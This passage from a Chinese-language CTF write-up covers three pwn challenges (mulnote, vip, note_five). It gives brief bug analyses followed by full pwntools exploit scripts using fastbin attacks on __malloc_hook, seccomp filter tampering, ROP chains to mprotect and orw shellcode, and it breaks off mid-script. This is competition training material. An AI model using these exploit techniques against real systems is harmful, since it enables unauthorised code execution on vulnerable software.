    }
    main();
## mutnote
Ollvm混淆。但在ida函数列表中发现了start_routine函数，直接看此函数发现free后sleep再将指针清空。  
漏洞就很明显了，条件竞争引起的uaf。直接上gdb调试，fastbin attack攻击malloc_hook完成利用。
    #-*- coding: utf-8 -*-    from pwn import *
    binary_file = './mulnote'
    context.binary = binary_file
    context.terminal = ['tmux', 'sp', '-h']
    elf = ELF(binary_file)
    libc = elf.libc
    one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
    libc.symbols['one_gadget'] = one_gadgets[1]
    context.log_level = 'debug'
    def dbg(breakpoint):
        glibc_dir = '/usr/src/glibc/glibc-2.23/'
        gdbscript = 'directory %smalloc\n' % glibc_dir
        gdbscript += 'directory %sstdio-common/\n' % glibc_dir
        gdbscript += 'directory %sstdlib/\n' % glibc_dir
        gdbscript += 'directory %slibio\n' % glibc_dir
        elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(io.pid)).readlines()[1], 16) if elf.pie else 0
        gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
        gdbscript += 'c\nvis_heap_chunks 0x555555757000 20\n'
        log.info(gdbscript)
        gdb.attach(io, gdbscript)
        time.sleep(1)
    def exploit(io):
        s       = lambda data               :io.send(str(data)) 
        sa      = lambda delim,data         :io.sendafter(str(delim), str(data))
        sl      = lambda data               :io.sendline(str(data))
        sla     = lambda delim,data         :io.sendlineafter(str(delim), str(data))
        r       = lambda numb=4096          :io.recv(numb)
        ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
        irt     = lambda                    :io.interactive()
        uu32    = lambda data               :u32(data.ljust(4, '\0'))
        uu64    = lambda data               :u64(data.ljust(8, '\0'))
        def create(a,b):
            io.writeline('C')
            io.readuntil('>')
            io.writeline(a)
            io.readuntil('>')
            io.writeline(b)
            io.readuntil('>')
        def remove(a):
            io.writeline('R')
            io.readuntil('>')
            io.writeline(a)
            io.readuntil('>')
        def edit(a,b):
            io.writeline('E')
            io.readuntil('>')
            io.writeline(a)
            io.readuntil('>')
            io.writeline(b)
            io.readuntil('>')
        # dbg(elf.plt.malloc) # malloc
        # dbg(elf.plt.free) # free
        # dbg(0xf) # edit
        ru('>')
        # overlap
        create('256','1111111')
        remove('0')
        io.writeline('S')
        ru('\n')
        libc.address= uu64(r(6))-libc.sym.__malloc_hook-88-0x10
        success('libc.address = 0x%x' % libc.address)
        create('96','1111111111111111111111')
        create('96','1111111111111111111111')
        create('96','1111111111111111111111')
        remove('1')
        remove('2')
        remove('1')
        create('96',p64(libc.sym.__malloc_hook-0x23))
        create('96',p64(libc.sym.__malloc_hook-0x23))
        create('96',p64(libc.sym.__malloc_hook-0x23))
        # dbg(elf.plt.malloc) # malloc
        create('96','a'*0x13+p64(libc.sym.one_gadget))
        io.writeline('C')
        io.readuntil('>')
        io.writeline('96')
        return io
    if __name__ == '__main__':
        if len(sys.argv) > 1:
            io = remote(sys.argv[1], sys.argv[2])
        else:
            io = process(binary_file, 0)
        exploit(io)
        io.interactive()
## vip
溢出sock_filter结构体，篡改ptrcl的沙盒规则，使openat的syscall return
0（libc的open使用的不是sys_open，巨坑），open函数返回0后read就是从stdin读取数据了。这样就可以stack
leak，知道stack_addr之后，算出ret_addr，通过堆溢出一直覆盖到chunk_list的位置，然后在第一个堆块放置ret_addr，从而绕过canary构造rop，然后由于之前已经知道libc了，所以直接通过libc中的pop_rdx_ret，来传第三个参数，由于禁用了system和execve，所以通过调用mprotect给bss段上执行权限，然后在bss段放orw_shellcode，即执行open("/flag")、read(3,buf,size)、write(1,buf,size)，执行即可输出flag
    #!/usr/bin/python2.7  
    # -*- coding: utf-8 -*-    from pwn import *
    context.log_level = "debug"
    context.arch = "amd64"
    elf = ELF("vip")
    sh = 0
    lib = 0
    def vip():
        sh.sendlineafter(":","6")
        sh.sendafter(':',flat('a'*0x20, 
        0x0000000000000020, 0x0000010101000015, 
        0x0005000000000006, 0x7fff000000000006,))
    def add(idx):
        sh.recvuntil("Your choice:")
        sh.sendline("1")
        sh.sendlineafter(":",str(idx))
    def free(idx):
        sh.sendlineafter("Your choice:","3")
        sh.sendlineafter(":",str(idx))
    def show(idx):
        sh.sendlineafter("Your choice:","2")
        sh.sendlineafter(":",str(idx))
    def edit(idx,size,content):
        sh.recvuntil("Your choice:")
        sh.sendline("4")
        sh.recvuntil(":")
        sh.sendline(str(idx))
        sh.sendlineafter(":",str(size))
        sh.recvuntil("Content:")
        sh.send(content)
    def pwn(ip,port,debug):
        global sh
        global lib
        if(debug == 1):
            sh = process("./vip")
            lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")
        else:
            sh = remote(ip,port)
            lib = ELF("libc-2.27.so")
        chunk_list = 0x404100
        vip()
        add(0)
        add(1)
        add(5)
        add(6)
        add(10)
        free(6)
        free(1)
        payload = 'a' * 0x50 + p64(0) + p64(0x61) + p64(elf.got['free'])
        edit(0,0x70,payload)
        add(1)
        add(2)
        show(2)
        free_addr = u64(sh.recvuntil("\x7f",False)[-6:].ljust(8,'\x00'))
        libc = free_addr - lib.symbols['free']
        system = libc + lib.symbols['system']
        execve = libc + lib.symbols['execve']
        printf = libc + lib.symbols['printf']
        mprotect = libc + lib.symbols['mprotect']
        edit(2,9,p64(printf))
        edit(10,8,"%8$p\x00")
        free(10)
        sh.recvuntil("0x")
        stack = int(sh.recvuntil("Done!",True),16) - 8 * 13
        payload  = p64(libc + lib.symbols['free'])
        payload += p64(libc + lib.symbols['puts'])
        payload += p64(libc + lib.symbols['__stack_chk_fail'])
        payload += p64(libc + lib.symbols['printf'])
        payload += p64(libc + lib.symbols['memset'])
        payload += p64(libc + lib.symbols['read'])
        payload += p64(libc + lib.symbols['prctl'])
        payload += p64(libc + lib.symbols['malloc'])
        payload += p64(libc + lib.symbols['setvbuf'])
        payload += p64(libc + lib.symbols['open'])
        payload += p64(libc + lib.symbols['perror'])
        payload += p64(libc + lib.symbols['atoi'])
        payload += p64(libc + lib.symbols['scanf'])
        payload += p64(libc + lib.symbols['exit'])
        payload = payload.ljust(0x4040a0 - 0x404018,'\x00')
        payload += p64(libc + lib.symbols['_IO_2_1_stdout_']) + p64(0)
        payload += p64(libc + lib.symbols['_IO_2_1_stdin_']) + p64(0)
        payload += p64(libc + lib.symbols['_IO_2_1_stderr_'])
        payload += p64(0) * 7
        payload += p64(stack)
        edit(2,0x500,payload)
        pop_rdx_ret = 0x1b96 + libc
        pop_rdi_ret = 0x4018fb
        pop_rsi_r15_ret = 0x4018f9
        base = 0x404000
        payload = p64(pop_rdi_ret) + p64(base)
        payload += p64(pop_rsi_r15_ret) + p64(0x1000) + p64(0)
        payload += p64(pop_rdx_ret) + p64(7)
        payload += p64(mprotect)
        payload += p64(pop_rdi_ret) + p64(0)
        payload += p64(pop_rsi_r15_ret) + p64(base + 0x800) + p64(0)
        payload += p64(pop_rdx_ret) + p64(0x500)
        payload += p64(libc + lib.symbols['read'])
        payload += p64(base + 0x800)
        edit(0,0x500,payload)
        sleep(0.2)
        payload = 'H\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8.gm`f\x01\x01\x01H1\x04$H\x89\xe71\xd21\xf6j\x02X\x0f\x051\xc0j\x03_j@Z\xbe\x01\x01\x01\x01\x81\xf6\xa1AA\x01\x0f\x05j\x01_j@Z\xbe\x01\x01\x01\x01\x81\xf6\xa1AA\x01j\x01X\x0f\x05'
        sh.sendline(payload)
        log.success("libc: " + hex(libc))
        log.success("stack: " + hex(stack))
        log.success("system: " + hex(system))
        if(debug == 1):
            log.success("pid: " + str(sh.pid))
        sh.interactive()
    if __name__ == "__main__":
        pwn("112.126.103.14",9999,0)
## note_five
漏洞在edit的时候溢出。但由于限制了堆大小，先用unsorted bin attack改掉global_max_fast，然后就可以愉快的fastbin
attack了。先fast到stdout改write_base leak得到libc，然后fast到
**malloc_hook改hook，比较蛋疼的是one_gadget全失效了，于是用到**
libc_realloc+某个偏移。从+1一直试到+13，终于成功在[rsp+0x30]得到一个0，然后让__realloc_hook为one_gadget就行了
    #-*- coding: utf-8 -*-    from pwn import *
    __author__ = '3summer'
    binary_file = './note_five'
    context.binary = binary_file
    context.terminal = ['tmux', 'sp', '-h']
    elf = ELF(binary_file)
    libc = elf.libc
    one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
    libc.symbols['one_gadget'] = one_gadgets[1]
    context.log_level = 'debug'
    def dbg(breakpoint):
        glibc_dir = '/usr/src/glibc/glibc-2.23/'
        gdbscript = 'directory %smalloc\n' % glibc_dir
        gdbscript += 'directory %sstdio-common/\n' % glibc_dir
        gdbscript += 'directory %sstdlib/\n' % glibc_dir
        gdbscript += 'directory %slibio\n' % glibc_dir
        elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(io.pid)).readlines()[1], 16) if elf.pie else 0
        gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
        gdbscript += 'c\nvis_heap_chunks 0x555555757000 20\n'
        log.info(gdbscript)
        gdb.attach(io, gdbscript)
        time.sleep(1)
    def exploit(io):
        s       = lambda data               :io.send(str(data)) 
        sa      = lambda delim,data         :io.sendafter(str(delim), str(data))
        sl      = lambda data               :io.sendline(str(data))
        sla     = lambda delim,data         :io.sendlineafter(str(delim), str(data))
        r       = lambda numb=4096          :io.recv(numb)
        ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
        irt     = lambda                    :io.interactive()
        uu32    = lambda data               :u32(data.ljust(4, '\0'))
        uu64    = lambda data               :u64(data.ljust(8, '\0'))
        def choice(cmd, *argv):
            sla('>>',cmd)
            for i in argv:
                if isinstance(i,tuple):
                    sa((i[1]),i[0])
                    continue
                if isinstance(i,list):
                    sla(i[1],i[0])
                    continue
                sla(':',i)
        add     = lambda idx,size           :choice(1,idx,size)
        edit    = lambda idx,content        :choice(2,idx,(content,':'))
        delete  = lambda idx                :choice(3,idx)
        # dbg(elf.plt.malloc) # malloc
        # dbg(0xE6D) # free
        # dbg(0x0DEE) # edit
        add(0,0xe8)
        add(1,0xe8)
        add(2,0xe8)
        add(3,0xe8)
        add(4,0xe8)
        # dbg(0xE6D) # free
        delete(0)
        payload = 'a' * 0xe0 + p64(0x2d0) + '\xf0'
        edit(2,payload)
        delete(3)
        add(0,0x2d0 - 0x10)
        payload = '\x11' * 0xe0 
        payload += p64(0) + p64(0xf1)
        payload += '\x22' * 0xe0 + p64(0) + p64(0xf1) + "\n"
        edit(0,payload)
        delete(1)
        payload = '\x11' * 0xe0
        payload += p64(0) + p64(0xf1)
        payload += p64(0) + p16(0x37f8 - 0x10) + '\n'
        edit(0,payload)
        add(3,0xe8)
        add(3,0xe8)